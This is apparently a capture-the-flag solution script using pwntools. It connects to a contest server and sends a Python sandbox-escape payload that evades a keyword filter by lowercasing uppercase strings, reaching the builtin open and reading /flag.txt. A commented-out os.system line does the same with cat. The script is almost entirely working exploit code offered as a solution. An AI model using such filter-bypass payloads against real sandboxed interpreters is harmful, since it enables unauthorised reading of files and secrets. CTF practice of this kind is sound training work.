from pwn import *

conn = remote('chal.sigpwny.com', 5015)

conn.recvline()


# import os; os.system("cat /flag.txt")

exploit = "print(__builtins__.__dict__['OPEN'.lower()]('/FLAG.TXT'.lower()).read())"

# print("\FLAG.TXT".lower())

conn.sendline(exploit.encode())
conn.interactive()